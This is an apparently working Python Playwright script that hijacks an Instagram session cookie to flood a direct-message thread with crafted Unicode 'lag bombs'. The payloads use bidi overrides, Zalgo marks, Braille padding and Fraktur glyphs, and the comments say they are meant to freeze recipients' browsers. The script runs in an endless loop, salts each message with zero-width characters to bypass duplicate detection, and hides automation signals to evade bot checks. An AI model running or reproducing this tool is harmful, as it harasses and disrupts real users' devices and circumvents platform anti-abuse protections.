# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-LOCK V2)
# 📅 STATUS: RENDER-BLOCKING | 2-MPS | TOTAL-FREEZE

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload():
    """Forces the browser's Main Thread to lock during font-fallback rendering."""
    u_id = random.randint(1000, 9999)
    # 🧂 Salt to bypass server-side duplicate detection
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u2060"], k=10))
    
    # 💥 THE HEADER (Mathematical Bold-Fraktur)
    # These characters are extremely heavy for the browser to process.
    header = f"⚡ 【﻿ 𝕻𝕽𝕬𝖁𝕰𝕰𝕽　𝕻𝕬𝕻𝕬　𝕺𝕹　𝕿𝕺𝕻 】 ⚡\n🆔 {u_id}{salt}\n"
    
    # 🏗️ THE 'WIDTH-BOMB'
    # Using Braille Patterns (\u2800) forces the browser to expand the container width.
    width_bomb = "\u2800" * 45 
    
    # 🏗️ THE 'ZALGO-PILLAR' (Density 120)
    z_tower = "̸" * 120 
    
    lines = [header]
    for i in range(85): 
        # Bi-Directional Overrides: The core lag mechanism
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("012345", k=2))
        
        # We mix Script, Fraktur, and Double-Struck characters to force font-fallback lag
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_𝕺𝕹_𝕿𝕺𝕻_{noise}{z_tower}")
        
    return "\n".join(lines)[:9950]

async def fire_cycle(page, box):
    """Fires 2 rapid-succession bursts."""
    try:
        for _ in range(2):
            payload = get_kernel_stop_payload()
            await box.fill(payload)
            await page.keyboard.press("Enter")
            print("💀 [KERNEL-LOCK] PRAVEER PAPA ON TOP", flush=True)
            await asyncio.sleep(0.05) 
    except: pass

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        try:
            print(f"📡 Synchronizing Socket...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            print("✅ SOCKET ACTIVE. COMMENCING MAIN-THREAD LOCK.")

            while True:
                await fire_cycle(page, box)
                await asyncio.sleep(0.8)
                
                # Critical Jitter to keep the account delivering
                if random.random() < 0.1:
                    await asyncio.sleep(random.uniform(3, 7))

        except Exception as e:
            print(f"❌ Error: {str(e)[:50]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
